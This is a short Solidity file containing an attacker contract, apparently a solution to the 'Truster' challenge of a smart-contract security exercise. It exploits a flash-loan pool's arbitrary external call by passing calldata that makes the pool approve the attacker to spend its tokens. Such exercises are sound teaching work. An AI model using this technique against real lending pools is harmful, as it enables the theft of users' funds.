// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "hardhat/console.sol";

interface ITrusterLenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract TrusterAttacker {
    function attack(
        ITrusterLenderPool _trustLenderPool,
        ERC20 _erc20Token,
        address _attacker,
        uint256 _amount
    ) external {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            _attacker,
            _amount
        );
        _trustLenderPool.flashLoan(0, _attacker, address(_erc20Token), data);
    }
}
